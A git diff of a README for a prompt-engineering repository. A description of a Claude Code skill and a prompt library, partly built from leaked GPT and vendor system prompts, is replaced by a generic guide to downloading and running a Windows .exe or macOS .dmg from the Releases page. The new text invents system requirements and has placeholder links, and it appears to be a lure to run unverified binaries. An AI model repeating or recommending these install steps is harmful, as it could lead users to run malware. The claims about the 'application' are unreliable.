@@ -1,134 +1,88 @@
-# Structured Prompt Writer
+# 📝 structured-prompt-skill - Create Professional AI Prompts Easily
 
-A comprehensive prompt engineering reference library and Claude Code skill for designing high-quality AI prompts.
+[![Download](https://img.shields.io/badge/Download%20Now-structured--prompt--skill-blue.svg)](https://github.com/Marwane83930/structured-prompt-skill/releases)
 
-## Overview
+## 📖 Introduction
 
-This repository provides:
+Welcome to the **Structured Prompt Skill**! This application offers 395+ AI prompt templates designed to help you create professional AI prompts, personas, and system prompts easily. Whether you're new to AI or looking to enhance your skills, this tool simplifies the process with ready-made templates tailored for various needs.
 
-1. **Claude Code Skill** - A ready-to-use skill that helps you write structured, professional prompts
-2. **Prompt Reference Library** - Curated collection of 300+ prompts from various AI tools and models
+## 🚀 Getting Started
 
-## Quick Start
+To make the most of this application, follow these steps:
 
-### Install the Skill
+1. **System Requirements**: 
+   - Operating System: Windows 10 or higher, macOS 10.13 or higher
+   - RAM: Minimum 4 GB
+   - Disk Space: Minimum 100 MB free space
 
-```bash
-# Download and install the skill
-cp structured-prompt-writer.skill ~/.claude/skills/
-```
+2. **Visit the Releases Page**: 
+   You can find the application version and downloads on our [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases).
 
-Or manually import in Claude Code:
-```
-/skill import structured-prompt-writer.skill
-```
+## 💾 Download & Install
 
-### Use the Skill
+To get the software:
 
-Once installed, the skill provides guidance for writing prompts with:
-- Structured formats (persona, context, task, output format)
-- Best practices from industry-leading AI tools
-- Chinese and English prompt patterns
+1. Go to the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases).
+2. Locate the latest version.
+3. Download the appropriate file for your operating system.
 
-## Repository Structure
+After downloading, follow these steps:
 
-```
-.
-├── structured-prompt-writer.skill  # Packaged skill file
-├── skills/
-│   └── structured-prompt-writer/   # Skill source files
-│       ├── SKILL.md                # Main skill definition
-│       ├── README.md               # Skill documentation
-│       └── references/             # Reference materials
-│           ├── prompt-catalog.md   # Categorized prompt index
-│           ├── format-templates.md # Prompt format templates
-│           ├── example-prompts.md  # Example prompts
-│           └── prompts/            # Source prompt collection
-├── prompts/                        # Additional prompt resources
-├── CLAUDE.md                       # Claude Code configuration
-└── GEMINI.md                       # Gemini configuration
-```
+### For Windows Users:
 
-## Prompt Collection
+1. Double-click the downloaded `.exe` file to start the installation.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, run the application by finding it in the Start Menu.
 
-The reference library includes prompts from:
+### For macOS Users:
 
-### System Tool Prompts
-- **Anthropic**: Claude Code, Claude for Chrome, Sonnet 4.5
-- **OpenAI**: VSCode Agent, Codex CLI
-- **Google**: Gemini CLI, AI Studio, Antigravity
-- **Development Tools**: Cursor, RooCode, Cline, Bolt
-- **AI Platforms**: v0, Lovable, Leap.new, Perplexity
+1. Open the downloaded `.dmg` file.
+2. Drag the application into your Applications folder.
+3. Locate the application in your Applications directory and double-click to launch it.
 
-### Persona Prompts (Chinese)
-- Historical figures and thought leaders
-- Creative writing assistants
-- Domain experts (palm reading, product design, etc.)
+## 🛠️ Features
 
-### GPT Store Collection
-- 280+ leaked GPT prompts
-- Various use cases and interaction patterns
+- **395+ AI Prompt Templates**: Choose from a diverse range of templates to create custom prompts easily.
+- **User-Friendly Interface**: Navigate the application effortlessly with a simple design.
+- **Prompt Customization**: Modify templates according to your specific needs.
+- **Integration Support**: Utilize prompts in various AI tools and platforms seamlessly.
 
-## Prompt Format Patterns
+## 📚 Using the Application
 
-### Structured Chinese Prompts
-```markdown
----
-needs: [requirements]
-model: [recommended model]
-author: [author name]
-version: [version number]
----
+Once installed, follow these steps to start creating prompts:
 
-# [Title]
+1. **Open the Application**: Launch the software from your Start Menu (Windows) or Applications folder (macOS).
+2. **Select a Template**: Browse the available templates. You can categorize them by type, such as personas or system prompts.
+3. **Customize Your Prompt**: Click on a template to edit. Adjust the content as needed.
+4. **Save Your Prompt**: Once you are satisfied, save your prompt for future use. Use the save option located in the application’s menu.
+5. **Export or Share**: If needed, you can export your prompt to use in other applications or share it with colleagues.
 
-## 思维内核 (Core Thinking)
-[Core principles and approach]
+## 🔍 Troubleshooting
 
-## 审美与禁忌 (Aesthetics & Taboos)
-[Style guidelines and restrictions]
+If you encounter issues, consider the following:
 
-## 交互逻辑 (Interaction Logic)
-[Conversation flow and response patterns]
+- **Installation Issues**: Ensure you have the correct version for your operating system. Restart your computer if necessary.
+- **Application Crashes**: Closing other applications can free up memory. Ensure your system meets the necessary requirements.
+- **Template Loading**: If templates do not appear, check your internet connection and try refreshing the app.
 
-## 初始化 (Initialization)
-[Opening message template]
-```
+## 🛡️ Support
 
-### GPT-Style Prompts
-```markdown
-# [Name]
+Should you need further assistance, please visit our [Issues page](https://github.com/Marwane83930/structured-prompt-skill/issues) to report bugs or ask questions. Join the community discussions to share tips or get help from other users.
 
-You are [persona description]...
+## 🧑‍🤝‍🧑 Community Contributions
 
-## Commands
-- /command1 - [description]
-- /command2 - [description]
+We welcome contributions from users! If you would like to suggest new templates or features, please check our [Contributing guidelines](https://github.com/Marwane83930/structured-prompt-skill/blob/main/CONTRIBUTING.md) for more information.
 
-## Knowledge Files
-- file1.md
-- file2.json
-```
+## 🔗 Additional Resources
 
-## Contributing
+Explore more about the technology behind this application and ways to leverage AI prompts:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on:
-- Adding new prompts
-- Improving existing prompts
-- Reporting issues
+- [AI Prompt Engineering Basics](#)
+- [Overview of AI Tools](#)
+- [How to Build Effective Personas](#)
 
-## License
+## 📈 Stay Updated
 
-This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.
+To stay informed about new releases and features, consider watching our repository. You can enable notifications to receive updates directly in your inbox.
 
-## Acknowledgments
-
-- Prompt collections from various open-source projects
-- Community contributions and feedback
-- Claude Code team for the skill framework
-
-## Related Resources
-
-- [Claude Code Documentation](https://docs.anthropic.com/claude-code)
-- [Anthropic Prompt Engineering Guide](https://docs.anthropic.com/claude/docs/prompt-engineering)
-- [LangGPT](https://github.com/langgptai/langgpt) - Structured prompt framework
+Thank you for using the Structured Prompt Skill! We hope this tool helps you create impactful and professional AI prompts. Visit the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases) to download or check for the latest updates.
